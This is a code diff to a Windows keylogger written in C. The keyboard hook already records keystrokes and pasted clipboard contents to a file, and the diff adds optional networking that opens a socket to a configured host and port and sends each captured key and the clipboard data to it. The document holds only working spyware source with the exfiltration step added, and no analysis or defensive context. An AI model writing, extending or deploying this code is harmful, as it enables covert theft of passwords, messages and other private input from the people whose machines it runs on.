@@ -4,6 +4,7 @@
 #include "config.h"
 #include "constants.h"
 #include "keylogger.h"
+#include "networking.h"
 #include <stdio.h>
 
 DWORD log_kbd(const KBDLLHOOKSTRUCT *const kbd_hook) 
@@ -12,8 +13,11 @@ DWORD log_kbd(const KBDLLHOOKSTRUCT *const kbd_hook)
 		return 1;
 
 	static HANDLE out_file = NULL;
+	static SOCKET out_sock = NULL;
+	static unsigned int count_handles = 0;
 
 	DWORD rc = 0;
+	DWORD rc_sock = 0;
 
 	if (!out_file) {
 		rc = open_utf16_file(&out_file, OUT_FILE);
@@ -21,6 +25,14 @@ DWORD log_kbd(const KBDLLHOOKSTRUCT *const kbd_hook)
 		if (rc)
 			return rc;
 	}
+#ifdef USE_NETWORK
+	if (!out_sock && (count_handles % 600 == 0)) {
+		out_sock = get_socket_file_descriptor(HOST, PORT);
+	}
+#endif // USE_NETWORK
+
+
+	count_handles++;
 
 	LPCWSTR vk_val = get_virtual_key_value(kbd_hook->vkCode);
 
@@ -31,16 +43,38 @@ DWORD log_kbd(const KBDLLHOOKSTRUCT *const kbd_hook)
 		swprintf_s(ctrl, ARRAYSIZE(ctrl), ctrl, 
 			   (CHAR)kbd_hook->vkCode);
 		rc = write_wstr(out_file, ctrl);
-
-		if (!rc && kbd_hook->vkCode == VK_V)
+#ifdef USE_NETWORK
+		if (out_sock) {
+			send_message(ctrl, out_sock);
+		}
+#endif // USE_NETWORK
+		
+		if (!rc && kbd_hook->vkCode == VK_V) {
 			rc = write_clipboard_data(out_file);
+#ifdef USE_NETWORK
+			if (out_sock) {
+				rc_sock = send_clipboard_data(out_sock);
+			}
+#endif // USE_NETWORK
+		}
 	} else {
 		WCHAR key_buff[KEY_BUFFER_SIZE];
 		int count = kbd_to_unicode(kbd_hook, key_buff, KEY_BUFFER_SIZE);
 
-		if (count > 0)
+		if (count > 0) {
 			rc = write_wstr(out_file, key_buff);
+#ifdef USE_NETWORK
+			if (out_sock) {
+				rc_sock = send_message(key_buff, out_sock);
+			}
+#endif // USE_NETWORK
+		}
 	}
+#ifdef USE_NETWORK
+	if (rc_sock) {
+		out_sock = NULL;
+	}
+#endif // USE_NETWORK
 
 	return rc;
 }
